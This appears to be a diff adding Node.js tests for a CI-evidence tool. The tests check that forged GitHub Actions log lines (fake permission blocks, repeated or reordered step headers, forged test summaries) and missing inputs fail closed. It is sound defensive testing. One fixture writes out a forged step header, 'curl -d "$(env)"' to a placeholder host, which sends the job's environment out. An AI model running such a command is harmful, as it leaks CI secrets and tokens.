@@ -7,7 +7,7 @@ import path from "node:path";
 import { after, test } from "node:test";
 import { main } from "../ci-evidence.mjs";
 import {
-  EvidenceError, buildEvidenceDocument, buildGithubCi, expectationsFromWorkflow, normalizeChecks, normalizeJobs, normalizeRun, parseJobLog,
+  EvidenceError, MANDATORY_CHECK_IDS, buildEvidenceDocument, buildGithubCi, compareRunHeaders, expectationsFromWorkflow, normalizeChecks, normalizeJobs, normalizeRun, parseJobLog,
 } from "../lib/ci-evidence.mjs";
 import { validate } from "../lib/json-schema.mjs";
 import { trustedBaseCheck } from "../lib/trusted-base.mjs";
@@ -514,6 +514,347 @@ test("command line: bad usage and bad input are refused with exit code 2, and a 
     assert.equal(run(["--repository", REPOSITORY, "--head", LIVE_SHA, "--run", good, "--jobs", jobs, ...trusted, "--surprise", "1"]).code, 2);
     assert.equal(run(["--repository", REPOSITORY, "--head", LIVE_SHA, "--run", good, "--jobs", jobs, ...trusted, "--out"]).code, 2);
     assert.equal(run(["--repository", "no spaces allowed", "--head", LIVE_SHA, "--run", good, "--jobs", jobs, ...trusted]).code, 2);
+  } finally {
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+/* ================================================================================================================
+ * OPS-0005B: fail-closed job-log parsing (F-1) and evidence that cannot read complete while mandatory checks never ran (F-2).
+ * Every mutation below is applied to a copy of the REAL job log of the first live run (see fixtures/ci/README.md).
+ * The log text is a claim by code that runs inside the job; these tests show what the parser refuses to believe, not that the
+ * log has become trustworthy.
+ * ============================================================================================================== */
+
+const MANDATORY = [...MANDATORY_CHECK_IDS];
+const GROUP_PERMISSIONS = "##[group]GITHUB_TOKEN Permissions";
+const BLOCK = (access = "read") => `${GROUP_PERMISSIONS}\nContents: ${access}\nMetadata: read\n##[endgroup]\n`;
+const TAP = (n) => `# tests ${n}\n# suites 0\n# pass ${n}\n# fail 0\n# cancelled 0\n# skipped 0\n`;
+/** Insert `extra` right after the line that opens a step, i.e. text printed by that step's own code. */
+const printedBy = (log, header, extra) => {
+  assert.ok(log.includes(`${header}\n`), `the real log has the header ${header}`);
+  return log.replace(`${header}\n`, `${header}\n${extra}`);
+};
+/** The real log with a write-access permission block, which is what a job that must not pass would print. */
+const writeAccess = (log) => log.replace("Contents: read", "Contents: write");
+const swapLines = (log, a, b) => log.replace(a, "\u0000a").replace(b, a).replace("\u0000a", b);
+const ci = (d) => build(d);
+
+test("F-1: the real log, as printed, has one initial permission block and every step header once and in order", () => {
+  const d = live();
+  const parsed = parseJobLog(d.log);
+  assert.equal(parsed.permission_blocks, 1);
+  assert.equal(parsed.permission_block_is_initial, true);
+  assert.deepEqual(parsed.repeated_run_headers, []);
+  assert.deepEqual(parsed.run_headers, expectations().step_headers.slice(1), "the log has every trusted step header but the first (this stored log is reduced and starts at the second step)");
+  const result = ci(d);
+  assert.deepEqual(failed(result), []);
+  for (const id of MANDATORY) assert.ok(result.consistency.find((c) => c.id === id && c.blocking && c.passed), `${id} ran and held`);
+});
+
+test("F-1: a forged permission block printed by a later step does not replace the real one, and fails the evidence", () => {
+  // the real block says write; a later step (the build runs branch code) prints a block that says read-only
+  const hidden = live();
+  hidden.log = printedBy(writeAccess(hidden.log), "##[group]Run npm run build", BLOCK("read"));
+  const a = ci(hidden);
+  assert.deepEqual(a.token_permissions.permissions, [{ scope: "contents", access: "write" }, { scope: "metadata", access: "read" }], "the first block is the one that is read");
+  assert.deepEqual(blocking(a).sort(), ["log.permission_block_is_single_and_initial", "log.token_is_read_only"]);
+  // the real block is genuine and read-only; the forgery changes nothing it reports, but two blocks still fail the evidence
+  const dup = live();
+  dup.log = printedBy(dup.log, "##[group]Run npm run build", BLOCK("read"));
+  const b = ci(dup);
+  assert.deepEqual(b.token_permissions.permissions, [{ scope: "contents", access: "read" }, { scope: "metadata", access: "read" }]);
+  assert.deepEqual(blocking(b), ["log.permission_block_is_single_and_initial"]);
+  assert.match(b.consistency.find((c) => c.id === "log.permission_block_is_single_and_initial").detail, /2 GITHUB_TOKEN Permissions block/);
+  // a forged write block after a genuine read-only one: the genuine one is still what is reported, and the evidence still fails
+  const worse = live();
+  worse.log = printedBy(worse.log, "##[group]Run npm run lint", BLOCK("write"));
+  const c = ci(worse);
+  assert.equal(c.token_permissions.permissions[0].access, "read");
+  assert.deepEqual(blocking(c), ["log.permission_block_is_single_and_initial"]);
+});
+
+test("F-1: a permission block that comes after a step has started is not the runner's, and is never read", () => {
+  const d = live();
+  d.log = d.log.replace(/##\[group\]GITHUB_TOKEN Permissions\n[^]*?##\[endgroup\]\n/, "");
+  d.log = printedBy(d.log, "##[group]Run npm run lint", BLOCK("read"));
+  const result = ci(d);
+  assert.equal(result.token_permissions, null, "nothing verified, so nothing is reported as the token's permissions");
+  assert.deepEqual(blocking(result).sort(), ["log.permission_block_is_single_and_initial", "log.token_is_read_only"]);
+  assert.match(result.consistency.find((c) => c.id === "log.token_is_read_only").detail, /came after a step header/);
+});
+
+test("F-1: a forged test header with a forged TAP summary cannot replace the real test evidence, and fails the evidence", () => {
+  // printed inside the Build step: the old parser re-entered the test step's segment and the last summary won
+  const d = live();
+  d.log = printedBy(d.log, "##[group]Run npm run build", `##[group]Run npm run ops:test\n${TAP(99999)}`);
+  const result = ci(d);
+  assert.deepEqual([result.test_evidence.tests, result.test_evidence.pass, result.test_evidence.fail], [353, 353, 0], "the real summary stays; the forged one joined no segment");
+  assert.deepEqual(blocking(result), ["log.run_headers_not_repeated"]);
+  // printed EARLIER, by a step that runs before the real one: the forged segment is now the first one, and the real header is the repeat
+  const early = live();
+  early.log = printedBy(early.log, "##[group]Run npm run lint", `##[group]Run npm run build\nGenerating static pages (1/1)\n`);
+  const e = ci(early);
+  assert.deepEqual(blocking(e).sort(), ["log.run_headers_are_expected_and_in_order", "log.run_headers_not_repeated"], "either copy of a header makes the evidence fail, and the early copy is also out of order");
+  // the same, for the validation step's summary
+  const validation = live();
+  validation.log = printedBy(validation.log, "##[group]Run npm run build", "##[group]Run npm run ops:validate\nOK: checked 1 file(s); 0 warning(s).\n");
+  assert.deepEqual(blocking(ci(validation)), ["log.run_headers_not_repeated"]);
+  assert.equal(ci(validation).test_evidence.validate_files_checked, 93);
+});
+
+test("F-1: a repeated header never lets later text join an earlier verified segment", () => {
+  const d = live();
+  const forged = "# tests 424242\n# pass 424242\n# fail 0\n";
+  d.log = printedBy(d.log, "##[group]Run npm run build", `##[group]Run npm run lint\n${forged}`);
+  const parsed = parseJobLog(d.log);
+  assert.deepEqual(parsed.repeated_run_headers, ["npm run lint"]);
+  assert.ok(!parsed.segments.get("npm run lint").some((l) => /424242/.test(l)), "the forged lines are in no segment");
+  assert.ok(!parsed.segments.get("npm run build").some((l) => /424242/.test(l)), "and not in the segment of the step that printed them");
+  for (const [name, lines] of parsed.segments) assert.ok(!lines.some((l) => /424242/.test(l)), `not in ${name}`);
+});
+
+test("F-1: the first occurrence wins in the parser: later content never overwrites an earlier result", () => {
+  const readThenWrite = parseJobLog(`${BLOCK("read")}##[group]Run npm run lint\n${BLOCK("write")}`);
+  assert.deepEqual(readThenWrite.permissions, [{ scope: "contents", access: "read" }, { scope: "metadata", access: "read" }]);
+  assert.equal(readThenWrite.permission_blocks, 2);
+  const writeThenRead = parseJobLog(`${BLOCK("write")}##[group]Run npm run lint\n${BLOCK("read")}`);
+  assert.equal(writeThenRead.permissions[0].access, "write", "the first block is kept even when a later one looks better");
+  const late = parseJobLog(`##[group]Run npm run lint\n${BLOCK("read")}`);
+  assert.equal(late.permissions, null);
+  assert.equal(late.permission_block_is_initial, false);
+  const none = parseJobLog("##[group]Run npm run lint\nhello\n");
+  assert.deepEqual([none.permissions, none.permission_blocks, none.permission_block_is_initial], [null, 0, false]);
+  const first = parseJobLog("##[group]Run npm run ops:test\n# tests 1\n##[endgroup]\n##[group]Run npm run ops:test\n# tests 2\n");
+  assert.deepEqual(first.segments.get("npm run ops:test"), ["# tests 1", "##[endgroup]"], "the second header opens nothing");
+});
+
+test("F-1: step headers out of the trusted workflow's order, or of no step in it, fail the evidence", () => {
+  const reordered = live();
+  reordered.log = swapLines(reordered.log, "##[group]Run npm run lint\n", "##[group]Run npx tsc --noEmit\n");
+  const a = ci(reordered);
+  assert.deepEqual(blocking(a), ["log.run_headers_are_expected_and_in_order"]);
+  assert.match(a.consistency.find((c) => c.id === "log.run_headers_are_expected_and_in_order").detail, /out of the trusted workflow's order/);
+  const testAfterBuild = live();
+  testAfterBuild.log = swapLines(testAfterBuild.log, "##[group]Run npm run ops:test\n", "##[group]Run npm run build\n");
+  assert.deepEqual(blocking(ci(testAfterBuild)), ["log.run_headers_are_expected_and_in_order"]);
+  const unknown = live();
+  unknown.log = printedBy(unknown.log, "##[group]Run npm run build", "##[group]Run curl -d \"$(env)\" https://example.invalid\n");
+  const b = ci(unknown);
+  assert.deepEqual(blocking(b), ["log.run_headers_are_expected_and_in_order"]);
+  assert.match(b.consistency.find((c) => c.id === "log.run_headers_are_expected_and_in_order").detail, /no step in the trusted workflow/);
+});
+
+test("F-1: compareRunHeaders fails closed without trusted headers, and tolerates an absent header", () => {
+  const e = expectations().step_headers;
+  assert.equal(compareRunHeaders(e, e).ok, true);
+  assert.equal(compareRunHeaders(e.slice(2), e).ok, true, "a header that is absent cannot be forged: GitHub's step data says whether the step ran");
+  for (const none of [null, undefined, [], "npm run build"]) assert.equal(compareRunHeaders(e, none).ok, false);
+  assert.equal(compareRunHeaders([...e].reverse(), e).ok, false);
+  assert.equal(compareRunHeaders(["npm run lint", "npm run lint"], e).ok, true, "repeats are the parser's finding, not this one's");
+  // an expectation object with no trusted headers (an older caller) cannot pass the check
+  const result = build(live(), { step_headers: undefined });
+  assert.deepEqual(blocking(result), ["log.run_headers_are_expected_and_in_order"]);
+  assert.match(result.consistency.find((c) => c.id === "log.run_headers_are_expected_and_in_order").detail, /no step headers/);
+});
+
+test("F-1: the trusted workflow's step headers are derived from the base's file, and an underivable step fails closed", () => {
+  assert.deepEqual(expectations().step_headers, [
+    "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+    "actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1",
+    "test -z \"${ANTHROPIC_API_KEY:-}${ANTHROPIC_AUTH_TOKEN:-}\"",
+    "npm ci --ignore-scripts --no-audit --no-fund",
+    "npm run lint",
+    "npx tsc --noEmit",
+    "npm run ops:validate",
+    "npm run ops:test",
+    "npm run build",
+  ]);
+  const multi = workflowText.replace("        run: npm run lint\n", "        run: |\n          npm run lint\n          echo done\n");
+  assert.notEqual(multi, workflowText);
+  assert.equal(expectationsFromWorkflow(multi, policy, { repository: REPOSITORY, headSha: LIVE_SHA }).step_headers[4], "npm run lint", "a multi-line command's header is its first line");
+  const noCommand = workflowText.replace("        run: npm run lint\n", "        shell: bash\n");
+  assert.notEqual(noCommand, workflowText);
+  assert.equal(expectationsFromWorkflow(noCommand, policy, { repository: REPOSITORY, headSha: LIVE_SHA }).step_headers, null);
+});
+
+test("F-1: legitimate logs still pass: timestamps, CRLF, ANSI colour and a byte-order mark change nothing", () => {
+  const stamp = (log) => log.split("\n").map((l, i) => `2026-11-17T12:21:${String(i % 60).padStart(2, "0")}.4443101Z ${l}`).join("\n");
+  const variants = {
+    "as stored": (l) => l,
+    "timestamps": stamp,
+    "CRLF": (l) => l.replaceAll("\n", "\r\n"),
+    "ANSI colour": (l) => l.replace(/^npm run (lint|build)$/gm, "\u001b[36;1mnpm run $1\u001b[0m"),
+    "byte-order mark": (l) => `﻿${l}`,
+    "all at once": (l) => `﻿${stamp(l).replaceAll("\n", "\r\n")}`,
+  };
+  const base = ci(live());
+  for (const [name, mutate] of Object.entries(variants)) {
+    const d = live();
+    d.log = mutate(d.log);
+    const result = ci(d);
+    assert.deepEqual(failed(result), [], name);
+    assert.deepEqual(result.test_evidence, base.test_evidence, name);
+    assert.deepEqual(result.token_permissions, base.token_permissions, name);
+  }
+});
+
+test("F-1: GitHub's step data stays the primary evidence: a clean-looking log cannot rescue a step that failed", () => {
+  const d = live();
+  jobOf(d).steps.find((s) => s.name === "Build").conclusion = "failure";
+  const result = ci(d);
+  assert.deepEqual(failed(result), ["steps.all_succeeded"], "the log is spotless, the step data is not");
+  assert.deepEqual(blocking(result), ["steps.all_succeeded"]);
+  const doc = documentFor("clean-docs", { mutate: (x) => { jobOf(x).steps.find((s) => s.name === "Build").conclusion = "failure"; } });
+  assert.equal(doc.verdict.ci_passed, false);
+  assert.equal(doc.github_ci.test_evidence.authority, "claim_by_output_of_the_code_under_test");
+});
+
+/* ------------------------------------------------------------------------------------------- F-2 */
+
+const inputs = (over) => (x) => Object.assign(x, over);
+
+test("F-2: with every mandatory input the evidence is complete and says nothing is missing", () => {
+  const doc = documentFor("clean-docs");
+  assert.deepEqual(doc.verdict.missing_evidence, []);
+  assert.equal(doc.verdict.evidence_complete, true);
+  assert.equal(doc.verdict.ci_passed, true);
+  for (const id of MANDATORY) assert.ok(doc.github_ci.consistency.find((c) => c.id === id && c.blocking && c.passed), id);
+  assert.deepEqual(validate(schema, doc).errors, []);
+});
+
+test("F-2: run and jobs alone cannot read complete or passed: the skipped checks are recorded, and the gap is listed", () => {
+  const doc = documentFor("clean-docs", { mutate: inputs({ checks: null, log: null }) });
+  assert.equal(doc.verdict.ci_passed, false, "not established as passed is not passed");
+  assert.equal(doc.verdict.evidence_complete, false);
+  assert.deepEqual(doc.verdict.missing_evidence, ["check_runs", "job_log"]);
+  assert.equal(doc.verdict.human_review_required, true);
+  for (const id of MANDATORY) {
+    const c = doc.github_ci.consistency.find((x) => x.id === id);
+    assert.ok(c, `${id} is in the document, not silently absent`);
+    assert.deepEqual([c.passed, c.blocking], [false, true], id);
+    assert.match(c.detail, /^not run: /, id);
+  }
+  assert.ok(doc.verdict.reasons.some((r) => /^mandatory evidence missing: check-run data and the job log;/.test(r)), doc.verdict.reasons.join(" | "));
+  assert.ok(!doc.verdict.reasons.some((r) => /^CI evidence check failed: .*not run/.test(r)), "one explicit line, not one alarming line per skipped check");
+  // partial observations stay accurate
+  assert.equal(doc.github_ci.workflow_run.conclusion, "success");
+  assert.equal(doc.github_ci.jobs[0].conclusion, "success");
+  assert.equal(doc.github_ci.jobs[0].steps.filter((s) => s.conclusion === "success").length >= 9, true);
+  assert.deepEqual([doc.github_ci.checks, doc.github_ci.token_permissions, doc.github_ci.test_evidence], [null, null, null]);
+  assert.deepEqual(failed(doc.github_ci).filter((id) => !MANDATORY.includes(id)), [], "no other check failed: only the skipped ones");
+  assert.deepEqual(validate(schema, doc).errors, []);
+});
+
+test("F-2: each missing input is identified on its own", () => {
+  const noLog = documentFor("clean-docs", { mutate: inputs({ log: null }) });
+  assert.deepEqual(noLog.verdict.missing_evidence, ["job_log"]);
+  assert.deepEqual([noLog.verdict.ci_passed, noLog.verdict.evidence_complete], [false, false]);
+  assert.deepEqual(blockingIds(noLog), ["log.permission_block_is_single_and_initial", "log.run_headers_are_expected_and_in_order", "log.run_headers_not_repeated", "log.token_is_read_only"]);
+  assert.equal(noLog.github_ci.consistency.find((c) => c.id === "checks.match_jobs_from_actions_app").passed, true, "the check runs that were supplied are still checked");
+  const noChecks = documentFor("clean-docs", { mutate: inputs({ checks: null }) });
+  assert.deepEqual(noChecks.verdict.missing_evidence, ["check_runs"]);
+  assert.deepEqual([noChecks.verdict.ci_passed, noChecks.verdict.evidence_complete], [false, false]);
+  assert.deepEqual(blockingIds(noChecks), ["checks.match_jobs_from_actions_app"]);
+  assert.equal(noChecks.github_ci.token_permissions.permissions.length, 2, "the log that was supplied is still read");
+  const noBase = documentFor("clean-docs", { ci: true, mutate: () => {} });
+  assert.deepEqual(noBase.verdict.missing_evidence, []);
+  const onlyBase = documentFor("clean-docs", { ci: false });
+  assert.deepEqual(onlyBase.verdict.missing_evidence, ["github_run_data", "check_runs", "job_log"]);
+  assert.equal(onlyBase.verdict.ci_passed, null, "null stays reserved for 'no GitHub data at all'");
+  const githubOnly = buildEvidenceDocument({ repository: REPOSITORY, headSha: LIVE_SHA, githubCi: build(live()), collector: COLLECTOR, now: NOW });
+  assert.deepEqual(githubOnly.verdict.missing_evidence, ["trusted_base"]);
+  assert.equal(githubOnly.verdict.evidence_complete, false);
+});
+const blockingIds = (doc) => doc.github_ci.consistency.filter((c) => c.blocking && !c.passed).map((c) => c.id).sort();
+
+test("F-2: malformed input is refused or fails closed, never skipped", () => {
+  const d = live();
+  throwsEv(() => buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: {}, jobLog: d.log, expected: expectations() }), "EV-SHAPE");
+  throwsEv(() => buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: d.checks, jobLog: 42, expected: expectations() }), "EV-SHAPE");
+  throwsEv(() => buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: "no", jobLog: d.log, expected: expectations() }), "EV-SHAPE");
+  // supplied but empty or foreign: supplied, so not "missing", but they prove nothing and the evidence fails
+  const emptyChecks = documentFor("clean-docs", { mutate: (x) => { x.checks.check_runs = []; } });
+  assert.deepEqual(emptyChecks.verdict.missing_evidence, []);
+  assert.equal(emptyChecks.verdict.ci_passed, false);
+  for (const log of ["", "\n", "hello\nthis is not a GitHub Actions log\n", "##[group]Run npm run build\n"]) {
+    const doc = documentFor("clean-docs", { mutate: inputs({ log }) });
+    assert.deepEqual(doc.verdict.missing_evidence, [], JSON.stringify(log));
+    assert.equal(doc.verdict.ci_passed, false, JSON.stringify(log));
+    assert.equal(doc.verdict.evidence_complete, false, JSON.stringify(log));
+    assert.ok(blockingIds(doc).includes("log.token_is_read_only"), JSON.stringify(log));
+  }
+});
+
+test("F-2: contradictory input sets fail the evidence without being called missing", () => {
+  const otherCommit = documentFor("clean-docs", { mutate: (x) => { x.run.head_sha = "e".repeat(40); } });
+  assert.deepEqual(otherCommit.verdict.missing_evidence, []);
+  assert.deepEqual([otherCommit.verdict.ci_passed, otherCommit.verdict.evidence_complete], [false, false]);
+  const checkSaysFailed = documentFor("clean-docs", { mutate: (x) => { x.checks.check_runs[0].conclusion = "failure"; } });
+  assert.deepEqual([checkSaysFailed.verdict.ci_passed, checkSaysFailed.verdict.evidence_complete, checkSaysFailed.verdict.missing_evidence], [false, false, []]);
+  const logWritesToken = documentFor("clean-docs", { mutate: (x) => { x.log = writeAccess(x.log); } });
+  assert.deepEqual([logWritesToken.verdict.ci_passed, logWritesToken.verdict.evidence_complete], [false, false]);
+  const stepsAndRunDisagree = documentFor("clean-docs", { mutate: (x) => { x.run.conclusion = "failure"; } });
+  assert.deepEqual([stepsAndRunDisagree.verdict.ci_passed, stepsAndRunDisagree.verdict.evidence_complete], [false, false]);
+});
+
+test("F-2: a GitHub section from elsewhere that lacks a mandatory check can never read as passed or complete", () => {
+  const head = sha("clean-docs");
+  const d = live(head);
+  const complete = buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: d.checks, jobLog: d.log, expected: expectations({ head_sha: head, branch: null }) });
+  const trustedBase = trustedBaseCheck({ repoDir: repo.dir, base: "main", head });
+  for (const id of MANDATORY) {
+    const legacy = { ...complete, consistency: complete.consistency.filter((c) => c.id !== id) };
+    const doc = buildEvidenceDocument({ repository: REPOSITORY, headSha: head, baseSha: sha("main"), trustedBase, githubCi: legacy, collector: COLLECTOR, now: NOW });
+    assert.equal(doc.verdict.ci_passed, false, id);
+    assert.equal(doc.verdict.evidence_complete, false, id);
+    assert.ok(doc.verdict.reasons.some((r) => r.includes(`CI evidence check missing: ${id}`)), id);
+  }
+});
+
+test("F-2: the schema accepts the current and the earlier verdict shape, and nothing looser", () => {
+  const good = documentFor("clean-docs");
+  assert.deepEqual(validate(schema, good).errors, []);
+  const earlier = structuredClone(good);
+  delete earlier.verdict.missing_evidence;
+  assert.deepEqual(validate(schema, earlier).errors, [], "a document written before missing_evidence existed stays valid");
+  const tamper = (fn) => {
+    const doc = structuredClone(good);
+    fn(doc);
+    return validate(schema, doc).valid;
+  };
+  assert.equal(tamper((x) => { x.verdict.missing_evidence = ["something_else"]; }), false);
+  assert.equal(tamper((x) => { x.verdict.missing_evidence = ["job_log", "job_log"]; }), false);
+  assert.equal(tamper((x) => { x.verdict.missing_evidence = "none"; }), false);
+  assert.equal(tamper((x) => { x.verdict.surprise = true; }), false);
+  assert.equal(tamper((x) => { delete earlier.verdict.ci_passed; x.verdict = earlier.verdict; }), false);
+  assert.equal(tamper((x) => { x.verdict.ci_trust_basis = "trusted"; }), false);
+});
+
+test("F-2 command line: partial inputs give ci passed false, name the missing evidence and ask for a human", () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "m1-ci-cli-"));
+  try {
+    const head = sha("clean-docs");
+    const d = live(head);
+    const files = { run: path.join(dir, "run.json"), jobs: path.join(dir, "jobs.json"), checks: path.join(dir, "checks.json"), log: path.join(dir, "job.log") };
+    fs.writeFileSync(files.run, JSON.stringify(d.run));
+    fs.writeFileSync(files.jobs, JSON.stringify(d.jobs));
+    fs.writeFileSync(files.checks, JSON.stringify(d.checks));
+    fs.writeFileSync(files.log, d.log);
+    const base = ["--repository", REPOSITORY, "--repo-dir", repo.dir, "--base", "main", "--head", "clean-docs", "--run", files.run, "--jobs", files.jobs];
+    const partial = run(base);
+    assert.equal(partial.code, 3, partial.err);
+    assert.match(partial.err, /ci passed: false; .*evidence complete: false/);
+    assert.match(partial.err, /missing mandatory evidence: check_runs, job_log/);
+    const doc = JSON.parse(partial.out);
+    assert.deepEqual([doc.verdict.ci_passed, doc.verdict.missing_evidence], [false, ["check_runs", "job_log"]]);
+    assert.deepEqual(validate(schema, doc).errors, []);
+    const noLog = run([...base, "--checks", files.checks]);
+    assert.equal(noLog.code, 3);
+    assert.match(noLog.err, /missing mandatory evidence: job_log\n/);
+    const full = run([...base, "--checks", files.checks, "--log", files.log]);
+    assert.equal(full.code, 0, full.err);
+    assert.doesNotMatch(full.err, /missing mandatory evidence/);
   } finally {
     fs.rmSync(dir, { recursive: true, force: true });
   }
